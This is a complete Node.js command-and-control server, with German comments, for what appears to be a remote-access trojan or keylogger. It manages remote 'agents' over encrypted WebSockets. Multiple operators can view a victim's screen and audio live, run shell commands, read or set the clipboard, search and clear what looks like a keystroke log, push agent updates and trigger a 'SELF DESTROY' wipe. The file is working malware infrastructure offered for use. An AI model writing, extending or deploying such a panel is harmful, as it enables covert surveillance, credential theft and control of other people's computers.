// rail panel — accounts, rollen, presence, audit, kick.
// Server hält den PSK und spricht mit den agents; der browser redet nur noch JSON/binary.
//
// env:  RAIL_PSK   base64 (32 byte)   pflicht
//       ADMIN_USER / ADMIN_PASS       wird bei jedem start angelegt
//       DATA_DIR   (default ./data)   users.json + audit.json

import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { hmac, makeChannel, randomBytes, equal, utf8, concat } from './crypto.js';

const PORT = process.env.PORT || 8080;
const PSK = process.env.RAIL_PSK || '';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || '';
const DATA_DIR = process.env.DATA_DIR || './data';
const PUB = path.join(process.cwd(), 'public');

const pskOk = PSK.length > 0 && Buffer.from(PSK, 'base64').length === 32;
if (!pskOk) console.error('### RAIL_PSK fehlt oder ist kein 32-byte base64 � panel laeuft im hinweis-modus');
const master = pskOk ? Buffer.from(PSK, 'base64') : Buffer.alloc(32);

// ------------------------------------------------------------------ store

const USERS_FILE = path.join(DATA_DIR, 'users.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.json');

let users = [];
let audit = [];

function ensureDir() { try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch { } }

function loadStore() {
  ensureDir();
  try { users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch { users = []; }
  try { audit = JSON.parse(fs.readFileSync(AUDIT_FILE, 'utf8')); } catch { audit = []; }
  if (!Array.isArray(users)) users = [];
  if (!Array.isArray(audit)) audit = [];
  ensureAdmin();
}

function saveUsers() { try { fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 1)); } catch { } }
function saveAudit() {
  try { audit = audit.slice(-2000); fs.writeFileSync(AUDIT_FILE, JSON.stringify(audit, null, 1)); } catch { }
}

function hashPassword(pass, salt) {
  return crypto.scryptSync(pass, salt, 32).toString('hex');
}

function makeUser(name, pass, role) {
  const salt = crypto.randomBytes(16).toString('hex');
  return { user: name, salt, hash: hashPassword(pass, salt), role, created: Date.now() };
}

function ensureAdmin() {
  if (!ADMIN_PASS) {
    if (!users.find((u) => u.role === 'admin')) {
      const p = crypto.randomBytes(6).toString('hex');
      users.push(makeUser(ADMIN_USER, p, 'admin'));
      saveUsers();
      console.log('### admin angelegt: ' + ADMIN_USER + ' / ' + p);
    }
    return;
  }
  const existing = users.find((u) => u.user.toLowerCase() === ADMIN_USER.toLowerCase());
  if (!existing) { users.push(makeUser(ADMIN_USER, ADMIN_PASS, 'admin')); saveUsers(); }
  else { Object.assign(existing, makeUser(ADMIN_USER, ADMIN_PASS, 'admin')); saveUsers(); }
}

function findByUser(name) {
  const n = String(name || '').toLowerCase();
  return users.find((u) => u.user.toLowerCase() === n) || null;
}

function checkPassword(user, pass) {
  if (!user) return false;
  const h = hashPassword(String(pass || ''), user.salt);
  return crypto.timingSafeEqual(Buffer.from(h), Buffer.from(user.hash));
}

// ------------------------------------------------------------------ sessions

const tokens = new Map();   // token -> {user, role, since, ip}
const browsers = new Map(); // token -> ws

function newToken(user, ip) {
  const t = crypto.randomBytes(24).toString('hex');
  tokens.set(t, { user: user.user, role: user.role, since: Date.now(), ip });
  return t;
}

function tokenOf(req) {
  const h = req.headers.authorization || '';
  if (h.startsWith('Bearer ')) return h.slice(7);
  return null;
}

function sessionOf(req) {
  const t = tokenOf(req);
  if (!t) return null;
  const s = tokens.get(t);
  if (!s) return null;
  return { token: t, ...s };
}

function logEvent(who, what, detail) {
  audit.push({ t: Date.now(), user: who, what, detail: detail || '' });
  if (audit.length % 25 === 0) saveAudit();
  broadcastAdmins({ t: 'audit', items: audit.slice(-200) });
}

function broadcastAdmins(msg) {
  for (const [tok, ws] of browsers) {
    const s = tokens.get(tok);
    if (s && s.role === 'admin' && ws.alive) ws.sendText(JSON.stringify(msg));
  }
}

function presence() {
  const out = [];
  for (const [tok, ws] of browsers) {
    const s = tokens.get(tok);
    if (!s) continue;
    out.push({ user: s.user, role: s.role, ip: s.ip, since: s.since, agents: ws.watching || 0 });
  }
  return out;
}

// ------------------------------------------------------------------ websocket

function acceptKey(key) {
  return crypto.createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
}

function encodeFrame(payload, opcode = 0x2) {
  const len = payload.length;
  let head;
  if (len < 126) { head = Buffer.alloc(2); head[0] = 0x80 | opcode; head[1] = len; }
  else if (len <= 0xffff) {
    head = Buffer.alloc(4); head[0] = 0x80 | opcode; head[1] = 126; head.writeUInt16BE(len, 2);
  } else {
    head = Buffer.alloc(10); head[0] = 0x80 | opcode; head[1] = 127; head.writeBigUInt64BE(BigInt(len), 2);
  }
  return Buffer.concat([head, payload]);
}

class Peer {
  constructor(socket) {
    this.socket = socket;
    this.buf = Buffer.alloc(0);
    this.frag = [];
    this.alive = true;
    this.watching = 0;
    socket.on('data', (d) => this.onData(d));
    socket.on('close', () => this.close());
    socket.on('error', () => this.close());
  }
  close() {
    if (!this.alive) return;
    this.alive = false;
    try { this.socket.end(); } catch { }
    if (this.onClose) this.onClose();
  }
  send(payload, opcode = 0x2) {
    if (!this.alive) return;
    try {
      if (this.socket.writableLength > 16 * 1024 * 1024) return;
      this.socket.write(encodeFrame(payload, opcode));
    } catch { this.close(); }
  }
  sendText(s) { this.send(Buffer.from(s, 'utf8'), 0x1); }
  onData(chunk) {
    this.buf = Buffer.concat([this.buf, chunk]);
    for (; ;) {
      if (this.buf.length < 2) return;
      const b0 = this.buf[0], b1 = this.buf[1];
      const fin = (b0 & 0x80) !== 0, opcode = b0 & 0x0f, masked = (b1 & 0x80) !== 0;
      let len = b1 & 0x7f, off = 2;
      if (len === 126) { if (this.buf.length < off + 2) return; len = this.buf.readUInt16BE(off); off += 2; }
      else if (len === 127) { if (this.buf.length < off + 8) return; len = Number(this.buf.readBigUInt64BE(off)); off += 8; }
      if (len > 64 * 1024 * 1024) { this.close(); return; }
      let mask = null;
      if (masked) { if (this.buf.length < off + 4) return; mask = this.buf.subarray(off, off + 4); off += 4; }
      if (this.buf.length < off + len) return;
      let payload = this.buf.subarray(off, off + len);
      this.buf = this.buf.subarray(off + len);
      if (mask) {
        const out = Buffer.allocUnsafe(len);
        for (let i = 0; i < len; i++) out[i] = payload[i] ^ mask[i & 3];
        payload = out;
      }
      if (opcode === 0x8) { this.close(); return; }
      if (opcode === 0x9) { this.send(payload, 0xa); continue; }
      if (opcode === 0xa) continue;
      if (opcode === 0x0) this.frag.push(payload); else this.frag = [payload];
      if (!fin) continue;
      const msg = this.frag.length === 1 ? this.frag[0] : Buffer.concat(this.frag);
      this.frag = [];
      if (this.onMessage) this.onMessage(msg);
    }
  }
}

// ------------------------------------------------------------------ agents

const agents = new Map();  // slot -> {slot, host, user, keys, ws, ch, mons, online, ip, pending}
let nextSlot = 1;

function deviceList() {
  return [...agents.values()].map((a) => ({
    slot: a.slot, host: a.host, user: a.user, keys: a.keys, online: !!a.ch, ip: a.ip,
  }));
}

function pushDevices() {
  const msg = JSON.stringify({ t: 'dev', devices: deviceList() });
  for (const [tok, ws] of browsers) if (ws.alive) ws.sendText(msg);
}

async function onAgent(peer, req, url) {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress;
  const slot = nextSlot++;
  const a = { slot, host: '', user: '', keys: -1, ws: peer, ch: null, mons: [], ip, pending: new Map() };
  agents.set(slot, a);
  logEvent('agent', 'connect', 'slot ' + slot + ' von ' + ip);
  pushDevices();

  let state = 0, na = null, nb = null;

  peer.onMessage = async (msg) => {
    try {
      if (state === 0) {
        if (msg.length !== 16) return;
        na = msg;
        nb = randomBytes(16);
        const tag = await hmac(master, utf8('op'), na, nb);
        peer.send(Buffer.concat([Buffer.from(nb), Buffer.from(tag)]));
        state = 1;
        return;
      }
      if (state === 1) {
        const want = await hmac(master, utf8('ag'), na, nb);
        if (!equal(msg, want)) { logEvent('agent', 'handshake rejected', 'slot ' + slot); peer.close(); return; }
        a.ch = await makeChannel(master, na, nb);
        state = 2;
        pushDevices();
        return;
      }

      const plain = await a.ch.open(msg);
      const type = plain[0];
      const body = plain.subarray(1);

      if (type === 0x10) {
        const d = JSON.parse(new TextDecoder().decode(body));
        a.host = d.host || ''; a.user = d.user || ''; a.keys = d.keys ?? -1;
        logEvent('agent', 'hello', a.user + '@' + a.host);
        pushDevices();
      } else if (type === 0x11) {
        const d = JSON.parse(new TextDecoder().decode(body));
        a.mons = d.items || [];
        pushOne(slot, { t: 'mons', slot, items: a.mons });
      } else if (type === 0x20) {
        if (body.length < 13) return;
        const dv = new DataView(body.buffer, body.byteOffset, 12);
        const w = dv.getInt32(0, true), h = dv.getInt32(4, true), mon = dv.getInt32(8, true);
        pushFrame(slot, w, h, mon, body.subarray(12));
      } else if (type === 0x60) {
        pushAudio(slot, body);
      } else if (type === 0x71) {
        pushOne(slot, { t: 'shell', slot, ...JSON.parse(new TextDecoder().decode(body)) });
      } else if (type === 0x73) {
        pushOne(slot, { t: 'clip', slot, ...JSON.parse(new TextDecoder().decode(body)) });
      } else if (type === 0x75) {
        pushOne(slot, { t: 'push', slot, ...JSON.parse(new TextDecoder().decode(body)) });
      } else if (type === 0x32) {
        const d = JSON.parse(new TextDecoder().decode(body));
        const items = d.items || [];
        const rid = body.toString ? null : null;
        for (const [id, cb] of a.pending) { cb(items); a.pending.delete(id); break; }
        pushOne(slot, { t: 'log', slot, items });
      }
    } catch (e) { /* ignore malformed */ }
  };

  peer.onClose = () => {
    agents.delete(slot);
    logEvent('agent', 'disconnect', 'slot ' + slot);
    pushDevices();
  };
}

function pushOne(slot, obj) {
  const msg = JSON.stringify(obj);
  for (const [tok, ws] of browsers) {
    if (ws.alive && ws.slot === slot) ws.sendText(msg);
  }
}

function pushFrame(slot, w, h, mon, jpeg) {
  const head = Buffer.alloc(17);
  head[0] = 1;
  head.writeUInt32BE(slot, 1);
  head.writeInt32BE(w, 5);
  head.writeInt32BE(h, 9);
  head.writeInt32BE(mon, 13);
  const frame = Buffer.concat([head, Buffer.from(jpeg)]);
  for (const [tok, ws] of browsers) {
    if (ws.alive && ws.slot === slot) ws.send(frame);
  }
}

function pushAudio(slot, pcm) {
  const head = Buffer.alloc(5);
  head[0] = 2;
  head.writeUInt32BE(slot, 1);
  const buf = Buffer.concat([head, Buffer.from(pcm)]);
  for (const [tok, ws] of browsers) {
    if (ws.alive && ws.slot === slot) ws.send(buf);
  }
}

async function sendAgent(slot, type, obj) {
  const a = agents.get(slot);
  if (!a || !a.ch) return false;
  const payload = Buffer.concat([Buffer.from([type]), Buffer.from(JSON.stringify(obj))]);
  a.ws.send(await a.ch.seal(payload));
  return true;
}

// ------------------------------------------------------------------ http

const MIME = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8' };

function json(res, code, obj) {
  const b = Buffer.from(JSON.stringify(obj));
  res.writeHead(code, { 'content-type': 'application/json', 'content-length': b.length, 'cache-control': 'no-store' });
  res.end(b);
}

async function body(req) {
  const chunks = [];
  for await (const c of req) { chunks.push(c); if (chunks.reduce((n, x) => n + x.length, 0) > 2e6) break; }
  try { return JSON.parse(Buffer.concat(chunks).toString('utf8') || '{}'); } catch { return {}; }
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://x');
  const p = url.pathname;

  if (p === '/health') {
    res.writeHead(200);
    res.end(pskOk ? 'ok ' + agents.size : 'missing RAIL_PSK');
    return;
  }

  if (!pskOk) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end('<body style="background:#0d0f12;color:#d6dce5;font:14px Segoe UI;padding:40px">' +
      '<h2>RAIL_PSK fehlt</h2><p>Render ? Environment ? <code>RAIL_PSK</code> = dein PSK (32 byte base64, aus <code>dist\\op.cfg</code>)</p>' +
      '<p>Danach <b>Manual Deploy ? Deploy latest commit</b>.</p></body>');
    return;
  }

  // ---- auth
  if (p === '/api/login' && req.method === 'POST') {
    const b = await body(req);
    const u = findByUser(b.user);
    if (!u || !checkPassword(u, b.pass)) {
      logEvent(b.user || '?', 'login failed', req.socket.remoteAddress || '');
      return json(res, 401, { error: 'falscher benutzer oder passwort' });
    }
    const t = newToken(u, (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress);
    logEvent(u.user, 'login', 'ok');
    return json(res, 200, { token: t, user: u.user, role: u.role });
  }

  if (p === '/api/logout' && req.method === 'POST') {
    const s = sessionOf(req);
    if (s) { tokens.delete(s.token); const w = browsers.get(s.token); if (w) w.close(); browsers.delete(s.token); logEvent(s.user, 'logout', ''); }
    return json(res, 200, { ok: true });
  }

  if (p === '/api/me') {
    const s = sessionOf(req);
    if (!s) return json(res, 401, { error: 'nicht eingeloggt' });
    return json(res, 200, { user: s.user, role: s.role, since: s.since });
  }

  // ---- alles folgende braucht einen login
  const s = sessionOf(req);
  if (p.startsWith('/api/') && !s) return json(res, 401, { error: 'nicht eingeloggt' });

  if (p === '/api/devices') return json(res, 200, { devices: deviceList() });

  if (p === '/api/ctl' && req.method === 'POST') {
    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht steuern' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x50, b.ctl || {});
    logEvent(s.user, 'ctl', b.slot + ' ' + JSON.stringify(b.ctl || {}).slice(0, 120));
    return json(res, 200, { ok: true });
  }

  if (p === '/api/input' && req.method === 'POST') {
    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht steuern' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x30, b.input || {});
    return json(res, 200, { ok: true });
  }

  if (p === '/api/log') {
    const slot = +url.searchParams.get('slot');
    const q = url.searchParams.get('q') || '';
    const n = +(url.searchParams.get('n') || 100000);
    const ok = await sendAgent(slot, 0x31, { s: q, n });
    if (!ok) return json(res, 400, { error: 'agent nicht verbunden' });
    logEvent(s.user, 'log query', 'slot ' + slot + ' "' + q + '"');
    return json(res, 200, { ok: true });
  }

  if (p === '/api/clear' && req.method === 'POST') {
    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x33, {});
    logEvent(s.user, 'log geleert', 'slot ' + b.slot);
    return json(res, 200, { ok: true });
  }

  if (p === '/api/wipe' && req.method === 'POST') {
    if (s.role !== 'admin' && s.role !== 'operator') return json(res, 403, { error: 'kein recht' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x52, {});
    logEvent(s.user, 'SELF DESTROY', 'slot ' + b.slot);
    return json(res, 200, { ok: true });
  }

  if (p === '/api/shell' && req.method === 'POST') {
    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x70, { id: b.id || String(Date.now()), cmd: b.cmd || '', shell: b.shell || 'cmd' });
    logEvent(s.user, 'shell', (b.cmd || '').slice(0, 120));
    return json(res, 200, { ok: true });
  }

  if (p === '/api/clip' && req.method === 'POST') {
    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x72, { id: b.id || String(Date.now()), act: b.act || 'get', text: b.text || '' });
    logEvent(s.user, 'clipboard ' + (b.act || 'get'), '');
    return json(res, 200, { ok: true });
  }

  if (p === '/api/push' && req.method === 'POST') {
    if (s.role !== 'admin' && s.role !== 'operator') return json(res, 403, { error: 'kein recht' });
    const b = await body(req);
    await sendAgent(+b.slot, 0x74, { seq: String(b.seq), last: b.last ? '1' : '0', data: b.data });
    if (b.last) logEvent(s.user, 'agent update', 'slot ' + b.slot + ' (' + (b.name || '?') + ')');
    return json(res, 200, { ok: true });
  }

  // ---- admin
  if (p.startsWith('/api/users')) {
    if (s.role !== 'admin') return json(res, 403, { error: 'nur admin' });

    if (p === '/api/users' && req.method === 'GET') {
      return json(res, 200, {
        users: users.map((u) => ({ user: u.user, role: u.role, created: u.created, online: [...tokens.values()].some((t) => t.user === u.user) })),
      });
    }
    if (p === '/api/users' && req.method === 'POST') {
      const b = await body(req);
      const name = String(b.user || '').trim();
      const pass = String(b.pass || '');
      const role = ['admin', 'operator', 'viewer'].includes(b.role) ? b.role : 'viewer';
      if (name.length < 3) return json(res, 400, { error: 'name zu kurz' });
      if (pass.length < 6) return json(res, 400, { error: 'passwort min. 6 zeichen' });
      if (findByUser(name)) return json(res, 400, { error: 'gibt es schon' });
      users.push(makeUser(name, pass, role));
      saveUsers();
      logEvent(s.user, 'user angelegt', name + ' (' + role + ')');
      return json(res, 200, { ok: true });
    }
    if (p === '/api/users/delete' && req.method === 'POST') {
      const b = await body(req);
      const u = findByUser(b.user);
      if (!u) return json(res, 404, { error: 'gibt es nicht' });
      if (u.user === ADMIN_USER) return json(res, 400, { error: 'admin nicht löschbar' });
      users = users.filter((x) => x !== u);
      saveUsers();
      for (const [tok, t] of tokens) if (t.user === u.user) { const ws = browsers.get(tok); if (ws) ws.close(); tokens.delete(tok); }
      logEvent(s.user, 'user gelöscht', u.user);
      return json(res, 200, { ok: true });
    }
    if (p === '/api/users/role' && req.method === 'POST') {
      const b = await body(req);
      const u = findByUser(b.user);
      if (!u) return json(res, 404, { error: 'gibt es nicht' });
      if (!['admin', 'operator', 'viewer'].includes(b.role)) return json(res, 400, { error: 'rolle?' });
      u.role = b.role;
      saveUsers();
      for (const t of tokens.values()) if (t.user === u.user) t.role = b.role;
      logEvent(s.user, 'rolle geändert', u.user + ' -> ' + b.role);
      return json(res, 200, { ok: true });
    }
    if (p === '/api/users/pass' && req.method === 'POST') {
      const b = await body(req);
      const u = findByUser(b.user);
      if (!u) return json(res, 404, { error: 'gibt es nicht' });
      if (String(b.pass || '').length < 6) return json(res, 400, { error: 'passwort min. 6 zeichen' });
      Object.assign(u, makeUser(u.user, b.pass, u.role));
      saveUsers();
      logEvent(s.user, 'passwort geändert', u.user);
      return json(res, 200, { ok: true });
    }
  }

  if (p === '/api/sessions') {
    if (s.role !== 'admin') return json(res, 403, { error: 'nur admin' });
    return json(res, 200, { sessions: presence() });
  }

  if (p === '/api/kick' && req.method === 'POST') {
    if (s.role !== 'admin') return json(res, 403, { error: 'nur admin' });
    const b = await body(req);
    let n = 0;
    for (const [tok, t] of tokens) {
      if (t.user !== b.user) continue;
      const ws = browsers.get(tok);
      if (ws) ws.close();
      browsers.delete(tok);
      tokens.delete(tok);
      n++;
    }
    logEvent(s.user, 'kick', b.user + ' (' + n + ' verbindung(en))');
    return json(res, 200, { ok: true, kicked: n });
  }

  if (p === '/api/audit') {
    if (s.role !== 'admin') return json(res, 403, { error: 'nur admin' });
    return json(res, 200, { items: audit.slice(-300) });
  }

  // ---- static
  let rel = p === '/' ? '/index.html' : p;
  rel = rel.replace(/\.\./g, '');
  const file = path.join(PUB, rel);
  if (!file.startsWith(PUB) || !fs.existsSync(file) || !fs.statSync(file).isFile()) {
    res.writeHead(404); res.end('not found'); return;
  }
  res.writeHead(200, { 'content-type': MIME[path.extname(file)] || 'application/octet-stream', 'cache-control': 'no-store' });
  fs.createReadStream(file).pipe(res);
});

// ------------------------------------------------------------------ upgrade

server.on('upgrade', (req, socket) => {
  const url = new URL(req.url, 'http://x');
  const key = req.headers['sec-websocket-key'];
  if (!key) { socket.destroy(); return; }

  const isAgent = url.pathname === '/agent';
  const isBrowser = url.pathname === '/ws';
  if (!isAgent && !isBrowser) { socket.destroy(); return; }

  let sess = null;
  if (isBrowser) {
    sess = tokens.get(url.searchParams.get('token') || '');
    if (!sess) { socket.destroy(); return; }
  }

  socket.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n' +
    'Sec-WebSocket-Accept: ' + acceptKey(key) + '\r\n\r\n');
  socket.setNoDelay(true);

  const peer = new Peer(socket);

  if (isAgent) { onAgent(peer, req, url); return; }

  const tok = url.searchParams.get('token');
  const old = browsers.get(tok);
  if (old) old.close();
  browsers.set(tok, peer);
  peer.slot = 0;
  peer.sendText(JSON.stringify({ t: 'dev', devices: deviceList() }));
  logEvent(sess.user, 'panel offen', '');
  if (sess.role === 'admin') peer.sendText(JSON.stringify({ t: 'audit', items: audit.slice(-200) }));

  peer.onMessage = async (msg) => {
    let d;
    try { d = JSON.parse(msg.toString('utf8')); } catch { return; }
    if (d.t === 'sel') { peer.slot = +d.slot || 0; return; }
    if (d.t === 'input') {
      if (sess.role === 'viewer') return;
      await sendAgent(+d.slot, 0x30, d.input || {});
      return;
    }
    if (d.t === 'ctl') {
      if (sess.role === 'viewer') return;
      await sendAgent(+d.slot, 0x50, d.ctl || {});
      return;
    }
  };

  peer.onClose = () => {
    if (browsers.get(tok) === peer) browsers.delete(tok);
    logEvent(sess.user, 'panel zu', '');
  };
});

loadStore();
server.listen(PORT, () => console.log('rail panel on :' + PORT + ' — agents ' + agents.size));
setInterval(() => { try { saveAudit(); } catch { } }, 30000);
